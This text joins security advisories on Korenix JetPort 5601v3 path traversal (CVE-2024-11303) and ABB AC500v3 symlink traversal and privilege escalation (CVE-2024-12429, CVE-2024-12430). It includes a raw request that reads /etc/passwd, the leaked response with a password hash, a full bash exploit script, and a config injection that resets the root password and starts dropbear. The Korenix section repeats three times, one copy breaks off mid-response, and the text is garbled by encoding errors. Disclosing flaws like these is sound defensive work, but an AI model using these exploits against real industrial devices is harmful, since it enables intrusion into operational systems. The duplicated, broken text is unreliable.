Vulnerable versions
-------------------------------------------------------------------------------
Korenix JetPort 5601v3 / v1.2

Vulnerability overview
-------------------------------------------------------------------------------
1) Path Traversal (CVE-2024-11303)
A path traversal attack for unauthenticated users is possible. This allows
getting access to the operating system of the device and access information
like configuration files and connections to other hosts or potentially other
sensitive information.

Proof of Concept
-------------------------------------------------------------------------------
1) Path Traversal (CVE-2024-11303)
By sending the following request to the following endpoint, a path traversal
vulnerability can be triggered:
-------------------------------------------------------------------------------
GET /%2e%2e/%2e%2e/etc/passwd HTTP/1.1
Host: 10.69.10.2
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: de,en-US;q=0.7,en;q=0.3
Te: trailers
Connection: keep-alive
-------------------------------------------------------------------------------
Note, that this is only possible when an interceptor proxy or a command line
tool is used. A web browser would encode the characters and the path traversal
would not work.
The response to the latter request is shown below:
-------------------------------------------------------------------------------
HTTP/1.1 200 OK
Server: thttpd/2.19-MX Jun  2 2022
Content-type: text/plain; charset=iso-8859-1
[...]
Accept-Ranges: bytes
Connection: Keep-Alive
Content-length: 86

root::0:0:root:/root:/bin/false
admin:$1$$CoERg7ynjYLsj2j4glJ34.:502:502::/:/bin/true
-------------------------------------------------------------------------------

The vulnerabilities were manually verified on an emulated device by using the
MEDUSA scalable firmware runtime (<https://medusa.cyberdanube.com>).

Solution
-------------------------------------------------------------------------------
None. Device is End-of-Life.

Workaround
-------------------------------------------------------------------------------
Limit the access to the device and place it within a segmented network.

# Multiple Vulnerabilities in ABB AC500v3

This work received funding from the Austrian Research Promotion Agency (FFG) in course of the KIRAS project TestCat (FO999911248) and was supported by AIT Austrian Institute of Technology.

## Vendor description

âABB is a technology leader in electrification and automation, enabling a more sustainable and resource-efficient future. The companyâs solutions connect engineering know-how and software to optimize how things are manufactured, moved, powered and operated.

Source: [https://global.abb/group/en/about/Â](https://global.abb/group/en/about/)

### Vulnerable versions

AC500v3 / <= 3.7.0.569

#### Vulnerability overview

1) Directory Traversal via Symlink (CVE-2024-12429)

A directory traversal vulnerability was identified in the file-explorer functionality of the device. An attacker can use this vulnerability to read system-wide files and configuration as user “system”.

2) Privilege Escalation (CVE-2024-12430)

A file which gets executed as “root” is owned by “system”. An attacker can abuse this by injecting arbitrary commands.

#### Proof of Concept

##### 1) Directory Traversal via Symlink (CVE-2024-12429)

When formatting a sd card to ext4 and creating a symlink to “/”, an attacker can access system critical files via the automation builder file-explorer.

```
#!/bin/bash
# CyberDanube 2024 <S. Dietz>
# abb ac500 symlink exploit
if [ -z "$1" ]; then
echo "usage: ./abb_ac500_symlink.sh /dev/sdX"
exit 1
fi
if [ "$(id -u)" -ne "0" ]; then
echo "This script must be run as root or with sudo."
exit 1
fi
DISK="$1"
PART="${DISK}1"
MOUNT_POINT="/mnt/sdcard"
SYMLINK_TARGET="/"
SYMLINK_NAME="pwned"
umount ${DISK}* 2>/dev/null
# Delete all existing partitions on the disk
(
echo o
echo w
) | fdisk "$DISK"
# Create a new partition on /dev/sda
(
echo n
echo p
echo 1
echo
echo
echo w
) | fdisk "$DISK"
partprobe "$DISK"
mkfs.ext4 -F "${PART}"
mkdir -p ${MOUNT_POINT}
mount ${PART} ${MOUNT_POINT}
ln -s ${SYMLINK_TARGET} ${MOUNT_POINT}/${SYMLINK_NAME}
ls -l ${MOUNT_POINT}
umount ${MOUNT_POINT}
echo "Done."
```

2) Privilege Escalation (CVE-2024-12430)

The file /mnt/sysdata/netconfig/ifs/ETH1 is writable by the user “system”. This file configures the network interface during boot as user “root”. An attacker can modify this file by using 1) and inject arbitrary commands. Our poc changes the root password and starts dropbear.

```
auto ETH1
iface ETH1 inet static
address 192.168.19.123
netmask 255.255.255.0
post-up ip route add 192.168.19.0/24 dev ETH1 table ETH1
post-up ip rule add from 192.168.19.123/32 table ETH1 priority 100
post-up ip rule add from 0.0.0.0/32 to 192.168.19.0/24 dev ETH1 table ETH1
post-up ip route add default via 192.168.19.254 table ETH1
post-up ip route add default via 192.168.19.254 dev ETH1 metric 0
post-up echo 'root:password' | chpasswd
post-up /etc/init.d/dropbear start
```
#### Solution

Update to the latest firmware

#### Workaround

None

#### Recommendation

Update to the latest firmware. See recommendations in the ABB Cyber Security Advisory for further information: <https://search.abb.com/library/Download.aspx?DocumentID=3ADR011377&LanguageCode=en&DocumentPartId=&Action=Launch>

## Vendor description

âKorenix Technology, a Beijer group company within the Industrial Communication business area, is a global leading manufacturer providing innovative, market-oriented, value-focused Industrial Wired and Wireless Networking Solutions. With decades of experiences in the industry, we have developed various product lines [â¦].

### Vulnerable versions

Korenix JetPort 5601v3 / v1.2

#### Vulnerability overview

1) Path Traversal (CVE-2024-11303)

A path traversal attack for unauthenticated users is possible. This allows getting access to the operating system of the device and access information like configuration files and connections to other hosts or potentially other sensitive information.

#### Proof of Concept

##### 1) Path Traversal (CVE-2024-11303)

By sending the following request to the following endpoint, a path traversal vulnerability can be triggered:

```
GET /%2e%2e/%2e%2e/etc/passwd HTTP/1.1
Host: 10.69.10.2
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: de,en-US;q=0.7,en;q=0.3
Te: trailers
Connection: keep-alive
```

Note, that this is only possible when an interceptor proxy or a command line tool is used. A web browser would encode the characters and the path traversal would not work.

The response to the latter request is shown below:

```
HTTP/1.1 200 OK
Server: thttpd/2.19-MX Jun 2 2022
Content-type: text/plain; charset=iso-8859-1

### Vulnerable versions

Korenix JetPort 5601v3 / v1.2

#### Vulnerability overview

1) Path Traversal (CVE-2024-11303)

A path traversal attack for unauthenticated users is possible. This allows getting access to the operating system of the device and access information like configuration files and connections to other hosts or potentially other sensitive information.

#### Proof of Concept

##### 1) Path Traversal (CVE-2024-11303)

By sending the following request to the following endpoint, a path traversal vulnerability can be triggered:

```
GET /%2e%2e/%2e%2e/etc/passwd HTTP/1.1
Host: 10.69.10.2
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: de,en-US;q=0.7,en;q=0.3
Te: trailers
Connection: keep-alive
```

Note, that this is only possible when an interceptor proxy or a command line tool is used. A web browser would encode the characters and the path traversal would not work.

The response to the latter request is shown below:

```
HTTP/1.1 200 OK
Server: thttpd/2.19-MX Jun 2 2022
Content-type: text/plain; charset=iso-8859-1
[â¦]
Accept-Ranges: bytes
Connection: Keep-Alive
Content-length: 86
root::0:0:root:/root:/bin/false
admin:$1$$CoERg7ynjYLsj2j4glJ34.:502:502::/:/bin/true
```

The vulnerabilities were manually verified on an emulated device by using the MEDUSA scalable firmware runtime (https://medusa.cyberdanube.com).

#### Solution

None. Device is End-of-Life.

#### Workaround

Limit the access to the device and place it within a segmented network.

#### Recommendation

CyberDanube recommends Korenix customers to upgrade to another device.
